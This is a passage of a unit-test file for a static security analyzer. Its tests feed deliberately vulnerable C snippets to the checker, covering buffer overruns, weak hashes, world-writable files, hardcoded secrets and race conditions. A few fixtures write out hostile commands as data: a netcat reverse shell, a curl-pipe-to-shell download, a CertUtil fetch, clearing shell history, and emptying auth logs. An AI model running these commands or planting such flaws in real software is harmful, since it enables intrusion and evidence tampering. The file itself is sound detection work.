void ok(void) { mkdir("/tmp/extra", 0755); }
)")),
             std::string("system-tampering@1 system-tampering@2"));
}

TEST(security_open64_creates_a_world_writable_file) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { open64(p, O_CREAT | O_WRONLY, 0666); }
void at(int d, const char *p) { openat64(d, p, O_CREAT | O_RDWR, 0666); }
void cr(const char *p) { creat64(p, 0666); }
void ok(const char *p) { open64(p, O_CREAT | O_WRONLY, 0600); }
void rd(const char *p) { open64(p, O_RDONLY, 0666); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2 "
                         "insecure-permissions@3"));
}

TEST(security_bounds_checked_copy_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; gets_s(buf, 64); }
void cp(void) { char buf[8]; memcpy_s(buf, 64, src, n); }
void sc(void) { char buf[8]; strcpy_s(buf, 64, src); }
void cat(void) { char buf[8]; strcat_s(buf, 64, src); }
void ok(void) { char buf[8]; gets_s(buf, 8); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3 "
                         "unbounded-copy@4"));
}

TEST(security_vsnprintf_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; vsnprintf(buf, 64, "%s", ap); }
void ok(void) { char buf[8]; vsnprintf(buf, 8, "%s", ap); }
)")),
             std::string("unbounded-copy@1"));
}

TEST(security_wcsncpy_sizeof_a_pointer) {
    CHECK_EQ(security(code(R"(
void bad(wchar_t *p) { wchar_t buf[32]; wcsncpy(buf, src, sizeof p); }
void mv(wchar_t *p) { wchar_t buf[32]; wmemcpy(buf, src, sizeof p); }
void ok(wchar_t *p) { wchar_t buf[32]; wcsncpy(buf, src, 32); }
)")),
             std::string("sizeof-pointer@1 sizeof-pointer@2"));
}

TEST(security_read_sizeof_a_pointer) {
    CHECK_EQ(security(code(R"(
void bad(int fd, char *p) { char buf[32]; read(fd, buf, sizeof p); }
void net(int fd, char *p) { char buf[32]; recv(fd, buf, sizeof p, 0); }
void line(FILE *f, char *p) { char buf[32]; fgets(buf, sizeof p, f); }
void ok(int fd) { char buf[32]; read(fd, buf, sizeof buf); }
)")),
             std::string("sizeof-pointer@1 sizeof-pointer@2 sizeof-pointer@3"));
}

TEST(security_snprintf_sizeof_a_pointer) {
    CHECK_EQ(security(code(R"(
void bad(char *p) { char buf[32]; snprintf(buf, sizeof p, "%s", p); }
void copy(char *p) { char buf[32]; strncpy(buf, src, sizeof p); }
void wide(char *p) { char buf[32]; vsnprintf(buf, sizeof p, "%s", ap); }
void ok(char *p) { char buf[32]; snprintf(buf, sizeof buf, "%s", p); }
)")),
             std::string("sizeof-pointer@1 sizeof-pointer@2 sizeof-pointer@3"));
}

TEST(security_shm_open_is_world_writable) {
    CHECK_EQ(security(code(R"(
void bad(void) { shm_open("/n", O_CREAT | O_RDWR, 0666); }
void sem(void) { sem_open("/n", O_CREAT, 0666, 1); }
void mq(void) { mq_open("/n", O_CREAT, 0666, 0); }
void ok(void) { shm_open("/n", O_CREAT | O_RDWR, 0600); }
void noflag(void) { shm_open("/n", O_RDWR, 0666); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2 "
                         "insecure-permissions@3"));
}

TEST(security_dlopen_of_outside_text) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { dlopen(argv[1], 2); }
void ns(char **argv) { dlmopen(0, argv[1], 2); }
void win(char **argv) { LoadLibraryA(argv[1]); }
void ok(void) { dlopen("libc.so.6", 2); }
)")),
             std::string("process-injection@1 process-injection@2 process-injection@3"));
}

TEST(security_url_set_from_outside) {
    CHECK_EQ(security(code(R"(
void bad(char **argv, void *u) { curl_url_set(u, CURLUPART_URL, argv[1], 0); }
void host(char **argv, void *u) { curl_url_set(u, CURLUPART_HOST, argv[1], 0); }
void soup(char **argv) { soup_message_new("GET", argv[1]); }
void ok(void *u) { curl_url_set(u, CURLUPART_URL, "https://example.com", 0); }
void path(char **argv, void *u) { curl_url_set(u, CURLUPART_PATH, argv[1], 0); }
)")),
             std::string("ssrf@1 ssrf@2 ssrf@3"));
}

TEST(security_ssrf_and_xss) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    CURL *curl;
    curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
    curl_easy_setopt(curl, CURLOPT_URL, "https://example.com");
    printf("<html><body>%s</body></html>", argv[1]);
    printf("<div class='item'>%s</div>", argv[2]);
    printf("plain text: %s\n", argv[1]);
    return 0;
}
)")),
             std::string("ssrf@3 xss@5 xss@6"));
}

TEST(security_off_by_one_and_integer_overflow) {
    CHECK_EQ(security(code(R"(
int main(int argc, char **argv) {
    char buf[16];
    buf[16] = 0;
    buf[sizeof(buf)] = 0;
    buf[sizeof(buf) - 1] = 0;
    buf[0] = 1;
    size_t n = atoi(argv[1]);
    size_t total = n * sizeof(int);
    if (n + 10 > 100) {
        return 1;
    }
    return 0;
}
)")),
             std::string("off-by-one@3 off-by-one@4 integer-overflow@8 integer-overflow@9"));
}

TEST(security_mkstemp_of_an_outside_template) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { mkstemp(argv[1]); }
void b2(char **argv) { mkostemp(argv[1], 0); }
void b3(char **argv) { mkstemps(argv[1], 2); }
void b4(char **argv) { mkostemps(argv[1], 2, 0); }
void ok(void) { char tmpl[] = "/tmp/xXXXXXX"; mkostemp(tmpl, 0); }
)")),
             std::string("unsafe-function@1 unsafe-function@2 unsafe-function@3 "
                         "unsafe-function@4"));
}

TEST(security_predictable_generator_for_a_key) {
    CHECK_EQ(security(code(R"(
void make_key(void) { int x = rand(); }
void mainish(void) { int key = random(); }
void play(void) { int score = rand(); }
void save(void) { int filename = rand(); }
void seed_key(void) { srand(1); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@5"));
}

TEST(security_memcpy_of_an_outside_length) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    char buf[8];
    memcpy(buf, argv[1], strlen(argv[1]));
}
void fit(void) {
    char big[32];
    char buf[64];
    fgets(big, 32, stdin);
    memcpy(buf, big, strlen(big));
}
void bigger(void) {
    char big[64];
    char buf[8];
    fgets(big, 64, stdin);
    memmove(buf, big, strlen(big));
}
void game(char **argv) {
    char buf[8];
    memcpy(buf, argv[1], 4);
}
)")),
             std::string("unbounded-copy@3 unbounded-copy@15"));
}

TEST(security_open_creates_a_world_writable_file) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { open(p, O_CREAT | O_WRONLY, 0666); }
void worse(const char *p) { open(p, O_RDWR | O_CREAT, 0777); }
void ok(const char *p) { open(p, O_CREAT | O_WRONLY, 0600); }
void rd(const char *p) { open(p, O_RDONLY, 0666); }
void made(const char *p) { creat(p, 0666); }
void at(int d, const char *p) { openat(d, p, O_CREAT | O_WRONLY, 0666); }
void dir(const char *p) { mkdir(p, 0777); }
void dir_ok(const char *p) { mkdir(p, 0755); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2 "
                         "insecure-permissions@5 insecure-permissions@6 "
                         "insecure-permissions@7"));
}

TEST(security_getcwd_and_readlink_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) {
    char buf[8];
    getcwd(buf, 64);
}
void link(const char *p) {
    char buf[8];
    readlink(p, buf, 64);
}
void ok(void) {
    char buf[64];
    getcwd(buf, sizeof buf);
}
void link_ok(const char *p) {
    char buf[64];
    readlink(p, buf, sizeof buf);
}
void at(int d, const char *p) {
    char buf[8];
    readlinkat(d, p, buf, 64);
}
)")),
             std::string("unbounded-copy@3 unbounded-copy@7 unbounded-copy@19"));
}

TEST(security_md2_is_a_weak_hash) {
    CHECK_EQ(security(code(R"(
void bad(void) { MD2(a, n, out); }
void ok(void) { SHA256(a, n, out); }
)")),
             std::string("weak-crypto@1"));
}

TEST(security_sql_prepare_of_outside_text) {
    CHECK_EQ(security(code(R"(
void wide(void *db, char **argv) { sqlite3_prepare16_v3(db, argv[1], -1, 0, &st, 0); }
void odbc(void *h, char **argv) { SQLPrepare(h, argv[1], -3); }
void wideodbc(void *h, char **argv) { SQLExecDirectW(h, argv[1], -3); }
void ok(void *db) { sqlite3_prepare16_v3(db, "select 1", -1, 0, &st, 0); }
)")),
             std::string("sql-injection@1 sql-injection@2 sql-injection@3"));
}

TEST(security_literal_windows_download) {
    CHECK_EQ(security(code(R"(
void bad(void) { system("CertUtil -urlcache -f http://example.com/a.exe a.exe"); }
void ok(void) { system("certutil -hashfile a.exe"); }
)")),
             std::string("dropper@1"));
}

TEST(security_histfile_turned_off) {
    CHECK_EQ(security(code(R"(
void bad(void) { setenv("HISTFILE", "/dev/null", 1); }
void size(void) { setenv("HISTSIZE", "0", 1); }
void cleared(void) { unsetenv("HISTFILE"); }
void ok(void) { setenv("HISTFILE", "/home/a/.history", 1); }
)")),
             std::string("log-tampering@1 log-tampering@2 log-tampering@3"));
}

TEST(security_literal_chmod_setuid_and_history) {
    CHECK_EQ(security(code(R"(
void bad(void) { system("chmod u+s /tmp/x"); }
void hist(void) { system("history -c"); }
void ok(void) { system("chmod 644 /tmp/x"); }
)")),
             std::string("privilege-escalation@1 log-tampering@2"));
}

TEST(security_literal_reverse_shell) {
    CHECK_EQ(security(code(R"(
void bad(void) { system("nc -e /bin/sh 10.0.0.1 4444"); }
void fetch(void) { system("curl http://example.com/a.sh | sh"); }
void ok(void) { system("ls"); }
)")),
             std::string("reverse-shell@1 dropper@2"));
}

TEST(security_chmod_sets_the_setuid_bit) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { chmod(p, 04755); }
void gid(const char *p) { chmod(p, 02755); }
void named(int fd) { fchmod(fd, S_ISUID | 0755); }
void at(int d, const char *p) { fchmodat(d, p, 04755, 0); }
void create(const char *p) { open(p, O_CREAT | O_WRONLY, 04755); }
void ok(const char *p) { chmod(p, 0755); }
void plain(const char *p) { open(p, O_CREAT | O_WRONLY, 0644); }
void both(const char *p) { chmod(p, 06777); }
)")),
             std::string("privilege-escalation@1 privilege-escalation@2 "
                         "privilege-escalation@3 privilege-escalation@4 "
                         "privilege-escalation@5 insecure-permissions@8 "
                         "privilege-escalation@8"));
}

TEST(security_trusted_name_on_a_file_or_thread) {
    CHECK_EQ(security(code(R"(
void bad(void) { memfd_create("kworker/0:1", 0); }
void named(void) { prctl(PR_SET_NAME, "kworker/0:1"); }
void thr(void) { pthread_setname_np(t, "kworker/0:1"); }
void ok(void) { memfd_create("lcbeh-note", 0); }
void plain(void) { prctl(PR_SET_NAME, "worker"); }
)")),
             std::string("masquerade@1 masquerade@2 masquerade@3"));
}

TEST(security_lookalike_host_in_source) {
    CHECK_EQ(security(code(R"(
void bad(void) { getaddrinfo("paypa1.com", 0, 0, 0); }
void url(void) { printf("https://paypa1.com/login"); }
void real(void) { getaddrinfo("paypal.com", 0, 0, 0); }
void plain(void) { printf("hello"); }
)")),
             std::string("masquerade@1 masquerade@2"));
}

TEST(security_rc2_is_a_weak_cipher) {
    CHECK_EQ(security(code(R"(
void s(void) { RC2_set_key(&k, n, data); }
void e(void) { RC2_ecb_encrypt(in, out, &k, 1); }
void c(void) { RC2_cbc_encrypt(in, out, n, &ks, iv, 1); }
void d(void) { DES_ede3_cbc_encrypt(in, out, n, &ks1, &ks2, &ks3, iv, 1); }
void ok(void) { AES_encrypt(in, out, &k); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3 weak-crypto@4"));
}

TEST(security_more_weak_algorithms) {
    CHECK_EQ(security(code(R"(
void kdf(void) { PKCS5_PBKDF2_HMAC_SHA1(pw, n, salt, ns, 1, 16, out); }
void des3(void) { EVP_des_ede3_cbc(); }
void rc2(void) { EVP_rc2_cbc(); }
void ok(void) { EVP_aes_256_gcm(); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3"));
}

TEST(security_md4_is_a_weak_hash) {
    CHECK_EQ(security(code(R"(
void bad(void) { MD4(a, b, c); }
void evp(void) { EVP_md4(); }
void ok(void) { SHA256(a, b, c); }
)")),
             std::string("weak-crypto@1 weak-crypto@2"));
}

TEST(security_at_forms_of_a_check_then_use) {
    CHECK_EQ(security(code(R"(
void bad(int d, const char *p) {
    if (access(p, W_OK) == 0)
        unlinkat(d, p, 0);
}
void atcheck(int d, const char *p) {
    if (faccessat(d, p, R_OK, 0) == 0)
        open(p, O_RDONLY);
}
void looked(int d, const char *p) {
    if (stat(p, &st) == 0)
        unlinkat(d, p, 0);
}
void mode(const char *p) { open(p, O_TMPFILE | O_RDWR, 0666); }
void mode_ok(const char *p) { open(p, O_TMPFILE | O_RDWR, 0600); }
)")),
             std::string("toctou-race@3 toctou-race@7 insecure-permissions@13"));
}

TEST(security_mkdtemp_of_an_outside_template) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { mkdtemp(argv[1]); }
void ok(void) { char tmpl[] = "/tmp/xXXXXXX"; mkdtemp(tmpl); }
)")),
             std::string("unsafe-function@1"));
}

TEST(security_name_calls_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void host(void) { char buf[8]; gethostname(buf, 64); }
void who(void) { char buf[8]; getlogin_r(buf, 64); }
void tty(int fd) { char buf[8]; ttyname_r(fd, buf, 64); }
void ok(void) { char buf[64]; gethostname(buf, sizeof buf); }
void tty_ok(int fd) { char buf[64]; ttyname_r(fd, buf, sizeof buf); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3"));
}

TEST(security_strftime_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; strftime(buf, 64, "%Y", tm); }
void wide(void) { wchar_t buf[4]; swprintf(buf, 8, L"hi"); }
void vwide(void) { wchar_t buf[4]; vswprintf(buf, 8, L"%s", ap); }
void wtime(void) { wchar_t buf[4]; wcsftime(buf, 8, L"%Y", tm); }
void ok(void) { char buf[64]; strftime(buf, 64, "%Y", tm); }
void wide_ok(void) { wchar_t buf[8]; swprintf(buf, 8, L"hi"); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3 "
                         "unbounded-copy@4"));
}

TEST(security_asctime_r_past_a_short_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; asctime_r(tm, buf); }
void ct(void) { char buf[8]; ctime_r(t, buf); }
void ok(void) { char buf[26]; asctime_r(tm, buf); }
void any(char *p) { ctime_r(t, p); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2"));
}

TEST(security_mempcpy_and_bcopy_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; mempcpy(buf, src, 64); }
void bc(void) { char buf[8]; bcopy(src, buf, 64); }
void bz(void) { char buf[8]; bzero(buf, 64); }
void wipe(void) { char buf[8]; explicit_bzero(buf, 64); }
void cc(void) { char buf[8]; memccpy(buf, src, 0, 64); }
void ok(void) { char buf[8]; mempcpy(buf, src, 8); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3 "
                         "unbounded-copy@4 unbounded-copy@5"));
}

TEST(security_getrandom_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[8]; getrandom(buf, 64, 0); }
void ent(void) { char buf[8]; getentropy(buf, 64); }
void arc(void) { char buf[8]; arc4random_buf(buf, 64); }
void ok(void) { char buf[8]; getrandom(buf, 8, 0); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3"));
}

TEST(security_sized_calls_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void domain(void) { char buf[8]; getdomainname(buf, 64); }
void pts(int fd) { char buf[8]; ptsname_r(fd, buf, 64); }
void conf(void) { char buf[8]; confstr(0, buf, 64); }
void ip(void) { char buf[8]; inet_ntop(2, addr, buf, 64); }
void name(void *sa) { char host[8]; char serv[8]; getnameinfo(sa, 16, host, 64, serv, 8, 0); }
void form(void) { char buf[8]; strxfrm(buf, src, 64); }
void ncpy(void) { char buf[8]; stpncpy(buf, src, 64); }
void ok(void) { char buf[64]; getdomainname(buf, 64); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3 "
                         "unbounded-copy@4 unbounded-copy@5 unbounded-copy@6 "
                         "unbounded-copy@7"));
}

TEST(security_wmemcpy_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { wchar_t buf[4]; wmemcpy(buf, src, 8); }
void move(void) { wchar_t buf[4]; wmemmove(buf, src, 8); }
void set(void) { wchar_t buf[4]; wmemset(buf, L'x', 8); }
void ncpy(void) { wchar_t buf[4]; wcsncpy(buf, src, 8); }
void ok(void) { wchar_t buf[4]; wmemcpy(buf, src, 4); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3 "
                         "unbounded-copy@4"));
}

TEST(security_cuserid_past_a_short_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { char buf[4]; cuserid(buf); }
void ok(void) { char buf[9]; cuserid(buf); }
void any(char *p) { cuserid(p); }
)")),
             std::string("unbounded-copy@1"));
}

TEST(security_setuid_zero_asks_for_root) {
    CHECK_EQ(security(code(R"(
void bad(void) { setuid(0); }
void e(void) { seteuid(0); }
void fs(void) { setfsuid(0); }
void g(void) { setgid(0); }
void eg(void) { setegid(0); }
void fsg(void) { setfsgid(0); }
void re(void) { setreuid(-1, 0); }
void reg(void) { setregid(0, -1); }
void res(void) { setresuid(-1, -1, 0); }
void resg(void) { setresgid(-1, 0, -1); }
void ok(void) { setuid(getuid()); }
void drop(void) { setreuid(getuid(), getuid()); }
)")),
             std::string("privilege-escalation@1 privilege-escalation@2 "
                         "privilege-escalation@3 privilege-escalation@4 "
                         "privilege-escalation@5 privilege-escalation@6 "
                         "privilege-escalation@7 privilege-escalation@8 "
                         "privilege-escalation@9 privilege-escalation@10"));
}

TEST(security_personality_turns_off_aslr) {
    CHECK_EQ(security(code(R"(
void bad(void) { personality(ADDR_NO_RANDOMIZE); }
void hex(void) { personality(0x40000); }
void both(void) { personality(PER_LINUX | ADDR_NO_RANDOMIZE); }
void ok(void) { personality(PER_LINUX); }
void query(void) { personality(0); }
)")),
             std::string("anti-analysis@1 anti-analysis@2 anti-analysis@3"));
}

TEST(security_wcscpy_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(void) { wchar_t buf[4]; wcscpy(buf, L"abcdef"); }
void cat(void) { wchar_t buf[4]; wcscat(buf, L"abcdef"); }
void wide(void) { wchar_t buf[4]; wcpcpy(buf, L"abcdef"); }
void ok(void) { wchar_t buf[8]; wcscpy(buf, L"abcd"); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@3"));
}

TEST(security_fread_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(FILE *f) { char buf[8]; fread(buf, 1, 100, f); }
void parts(FILE *f) { char buf[8]; fread(buf, 4, 4, f); }
void ok(FILE *f) { char buf[8]; fread(buf, 1, 8, f); }
void unlocked(FILE *f) { char buf[8]; fread_unlocked(buf, 1, 100, f); }
)")),
             std::string("unbounded-copy@1 unbounded-copy@2 unbounded-copy@4"));
}

TEST(security_fgets_unlocked_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(FILE *f) { char buf[8]; fgets_unlocked(buf, 64, f); }
void ok(FILE *f) { char buf[8]; fgets_unlocked(buf, 8, f); }
)")),
             std::string("unbounded-copy@1"));
}

TEST(security_tmpnam_r_is_a_race) {
    CHECK_EQ(security(code(R"(
void bad(char *buf) { tmpnam_r(buf); }
void ok(void) { char tmpl[] = "/tmp/xXXXXXX"; mkstemp(tmpl); }
)")),
             std::string("unsafe-function@1"));
}

TEST(security_vsscanf_without_a_width) {
    CHECK_EQ(security(code(R"(
void bad(char *s, va_list ap) { vsscanf(s, "%s", ap); }
void wide(wchar_t *s, va_list ap) { vswscanf(s, L"%s", ap); }
void sized(char *s, va_list ap) { vsscanf(s, "%9s", ap); }
void num(char *s, va_list ap) { vsscanf(s, "%d", ap); }
)")),
             std::string("unsafe-function@1 unsafe-function@2"));
}

TEST(security_swscanf_without_a_width) {
    CHECK_EQ(security(code(R"(
void bad(wchar_t *s) { wchar_t w[8]; swscanf(s, L"%s", w); }
void wide(wchar_t *s) { wchar_t w[8]; swscanf(s, L"%7s", w); }
void num(wchar_t *s) { int n; swscanf(s, L"%d", &n); }
)")),
             std::string("unsafe-function@1"));
}

TEST(security_wscanf_without_a_width) {
    CHECK_EQ(security(code(R"(
void bad(void) { wscanf(L"%s", w); }
void file(FILE *f) { fwscanf(f, L"%ls", w); }
void wide(void) { wscanf(L"%9s", w); }
void num(void) { wscanf(L"%d", n); }
)")),
             std::string("unsafe-function@1 unsafe-function@2"));
}

TEST(security_vscanf_without_a_width) {
    CHECK_EQ(security(code(R"(
void bad(va_list ap) { vscanf("%s", ap); }
void file(FILE *f, va_list ap) { vfscanf(f, "%s", ap); }
void wide(va_list ap) { vscanf("%9s", ap); }
void num(va_list ap) { vscanf("%d", ap); }
)")),
             std::string("unsafe-function@1 unsafe-function@2"));
}

TEST(security_digest_by_name_is_weak) {
    CHECK_EQ(security(code(R"(
void bad(void) { EVP_get_digestbyname("MD5"); }
void fetch(void *ctx) { EVP_MD_fetch(ctx, "SHA-1", 0); }
void cipher(void) { EVP_get_cipherbyname("DES-EDE3-CBC"); }
void rc(void *ctx) { EVP_CIPHER_fetch(ctx, "RC4", 0); }
void ok(void) { EVP_get_digestbyname("SHA256"); }
void named(void *ctx, const char *alg) { EVP_MD_fetch(ctx, alg, 0); }
)")),
             std::string("weak-crypto@1 weak-crypto@2 weak-crypto@3 weak-crypto@4"));
}

TEST(security_sysv_ipc_is_world_writable) {
    CHECK_EQ(security(code(R"(
void q(int key) { msgget(key, IPC_CREAT | 0666); }
void s(int key) { semget(key, 1, IPC_CREAT | 0666); }
void m(int key) { shmget(key, 64, IPC_CREAT | 0666); }
void ok(int key) { msgget(key, IPC_CREAT | 0600); }
void var(int key, int flags) { shmget(key, 64, flags); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2 "
                         "insecure-permissions@3"));
}

TEST(security_mknod_is_world_writable) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { mknod(p, 0666, 0); }
void typed(const char *p) { mknod(p, S_IFIFO | 0666, 0); }
void at(int d, const char *p) { mknodat(d, p, 0666, 0); }
void ok(const char *p) { mknod(p, 0600, 0); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2 "
                         "insecure-permissions@3"));
}

TEST(security_mkfifo_is_world_writable) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) { mkfifo(p, 0666); }
void at(int d, const char *p) { mkfifoat(d, p, 0777); }
void ok(const char *p) { mkfifo(p, 0600); }
)")),
             std::string("insecure-permissions@1 insecure-permissions@2"));
}

TEST(security_strlcpy_past_a_local_array) {
    CHECK_EQ(security(code(R"(
void bad(const char *s) {
    char buf[8];
    strlcpy(buf, s, 64);
}
void cat(const char *s) {
    char buf[8];
    strlcat(buf, s, 64);
}
void ok(const char *s) {
    char buf[8];
    strlcpy(buf, s, sizeof buf);
}
)")),
             std::string("unbounded-copy@3 unbounded-copy@7"));
}

TEST(security_aligned_alloc_of_a_wrapped_product) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    size_t n = strtoul(argv[1], 0, 10);
    char *p = aligned_alloc(16, n * 32);
}
void old(char **argv) {
    size_t n = strtoul(argv[1], 0, 10);
    char *p = memalign(16, n * 32);
}
void ok(void) { char *p = aligned_alloc(16, 32); }
void pos(char **argv) {
    void *p;
    size_t n = strtoul(argv[1], 0, 10);
    posix_memalign(&p, 16, n * 32);
}
)")),
             std::string("alloc-size-overflow@3 alloc-size-overflow@7 alloc-size-overflow@13"));
}

TEST(security_freopen_of_a_joined_path) {
    CHECK_EQ(security(code(R"(
void bad(char **argv, FILE *old) {
    char *path = malloc(128);
    snprintf(path, 128, "/data/%s", argv[1]);
    freopen(path, "w", old);
}
void ok(FILE *old) { freopen("/data/notes", "w", old); }
)")),
             std::string("path-traversal@4"));
}

TEST(security_euidaccess_and_statx_then_use) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) {
    if (euidaccess(p, R_OK) == 0)
        fopen(p, "r");
}
void also(int d, const char *p) {
    statx(d, p, 0, 0, &b);
    chmod(p, 0644);
}
void at(int d, const char *p) {
    if (access(p, W_OK) == 0)
        fchmodat(d, p, 0700, 0);
}
void ok(const char *p) { fopen(p, "r"); }
)")),
             std::string("toctou-race@3 toctou-race@7 toctou-race@11"));
}

TEST(security_wordexp_of_outside_text) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) { wordexp(argv[1], &w, 0); }
void ok(void) { wordexp("~/notes", &w, 0); }
)")),
             std::string("command-injection@1"));
}

TEST(security_wide_printf_of_a_format_variable) {
    CHECK_EQ(security(code(R"(
void bad(const wchar_t *fmt) { wprintf(fmt); }
void file(void *f, const wchar_t *fmt) { fwprintf(f, fmt); }
void ok(void) { wprintf(L"hi\n"); }
)")),
             std::string("format-string@1 format-string@2"));
}

TEST(security_crypt_is_a_weak_password_hash) {
    CHECK_EQ(security(code(R"(
void bad(const char *password, const char *salt) { crypt(password, salt); }
void again(const char *password, const char *salt, void *data) {
    crypt_r(password, salt, data);
}
void ok(const char *password) { SHA256(password, 8, out); }
)")),
             std::string("weak-crypto@1 weak-crypto@3"));
}

TEST(security_commoncrypto_md5_is_weak) {
    CHECK_EQ(security(code(R"(
void bad(void) { CC_MD5(a, n, out); }
void ok(void) { CC_SHA256(a, n, out); }
)")),
             std::string("weak-crypto@1"));
}

TEST(security_vasprintf_of_outside_text_is_a_command) {
    CHECK_EQ(security(code(R"(
void bad(char **argv) {
    char *cmd;
    vasprintf(&cmd, argv[1], ap);
    system(cmd);
}
void ok(void) {
    char *cmd;
    vasprintf(&cmd, "ls", ap);
    system(cmd);
}
)")),
             std::string("format-string@3 command-injection@4"));
}

TEST(security_access_then_link) {
    CHECK_EQ(security(code(R"(
void bad(const char *p) {
    if (access(p, W_OK) == 0)
        link(p, q);
}
void at(int d, const char *p) {
    if (access(p, W_OK) == 0)
        linkat(d, p, d, q, 0);
}
void own(const char *p) {
    if (access(p, W_OK) == 0)
        lchown(p, 0, 0);
}
void alias(int d, const char *p) {
    if (access(p, W_OK) == 0)
        symlinkat(p, d, q);
}
void ok(const char *p) { link(p, q); }
)")),
             std::string("toctou-race@3 toctou-race@7 toctou-race@11 toctou-race@15"));
}

TEST(security_gitlab_and_npm_tokens) {
    CHECK_EQ(security(code(R"(
void bad(void) { const char *t = "glpat-abcdefghij"; }
void npm(void) { const char *t = "npm_abcdefghij"; }
void ai(void) { const char *t = "sk-abcdefghijklmnopqrst"; }
void shortk(void) { const char *t = "sk-short"; }
void ok(void) { const char *t = "hello"; }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2 hardcoded-secret@3"));
}

TEST(security_authorization_header_is_hardcoded) {
    CHECK_EQ(security(code(R"(
void bad(void) { req("Authorization: Basic dXNlcjpwYXNz"); }
void bearer(void) { req("Authorization: Bearer eyJhbGciOi"); }
void ok(void) { req("Authorization: Basic "); }
void plain(void) { req("Content-Type: text/plain"); }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2"));
}

TEST(security_curl_password_is_hardcoded) {
    CHECK_EQ(security(code(R"(
void bad(void *c) { curl_easy_setopt(c, CURLOPT_USERPWD, "user:s3cret"); }
void proxy(void *c) { curl_easy_setopt(c, CURLOPT_PROXYUSERPWD, "user:s3cret"); }
void alone(void *c) { curl_easy_setopt(c, CURLOPT_PASSWORD, "s3cret"); }
void ok(void *c) { curl_easy_setopt(c, CURLOPT_USERPWD, user); }
void url(void *c) { curl_easy_setopt(c, CURLOPT_URL, "https://example.com"); }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2 hardcoded-secret@3"));
}

TEST(security_url_contains_a_password) {
    CHECK_EQ(security(code(R"(
void bad(void) { mongoc_client_new("mongodb://user:s3cret@db.example/app"); }
void pg(void) { PQconnectdb("postgresql://user:s3cret@localhost/db"); }
void ok(void) { PQconnectdb("postgresql://localhost/db"); }
void port(void) { curl("http://example.com:8080/a"); }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2"));
}

TEST(security_connector_password_is_hardcoded) {
    CHECK_EQ(security(code(R"(
void bad(void) { PQsetdbLogin(h, p, o, t, db, user, "s3cret"); }
void my(void *c) { mysql_real_connect(c, h, user, "s3cret", db, 3306, 0, 0); }
void ok(void) { PQsetdbLogin(h, p, o, t, db, user, 0); }
void env(void *c, char **argv) { mysql_real_connect(c, h, user, argv[1], db, 3306, 0, 0); }
)")),
             std::string("hardcoded-secret@1 hardcoded-secret@2"));
}

TEST(security_mysql_turns_off_tls) {
    CHECK_EQ(security(code(R"(
void bad(void *c) { mysql_options(c, MYSQL_OPT_SSL_MODE, SSL_MODE_DISABLED); }
void zero(void *c) { mysql_options(c, MYSQL_OPT_SSL_VERIFY_SERVER_CERT, 0); }
void ok(void *c) { mysql_options(c, MYSQL_OPT_CONNECT_TIMEOUT, 0); }
void on(void *c) { mysql_options(c, MYSQL_OPT_SSL_MODE, SSL_MODE_REQUIRED); }
)")),
             std::string("tls-no-verify@1 tls-no-verify@2"));
}

TEST(security_utime_of_a_log) {
    CHECK_EQ(security(code(R"(
void bad(void) { utime("/var/log/auth.log", 0); }
void at(int d) { utimensat(d, "/home/a/.bash_history", 0, 0); }
void link(void) { lutimes("/home/a/.zsh_history", 0); }
void ok(void) { utime("/tmp/x", 0); }
)")),
             std::string("log-tampering@1 log-tampering@2 log-tampering@3"));
}

TEST(security_open_empties_a_log) {
    CHECK_EQ(security(code(R"(
void bad(void) { fopen("/var/log/auth.log", "w"); }
void hist(void) { open("/home/a/.bash_history", O_WRONLY | O_TRUNC); }
void app(void) { fopen("/var/log/auth.log", "a"); }
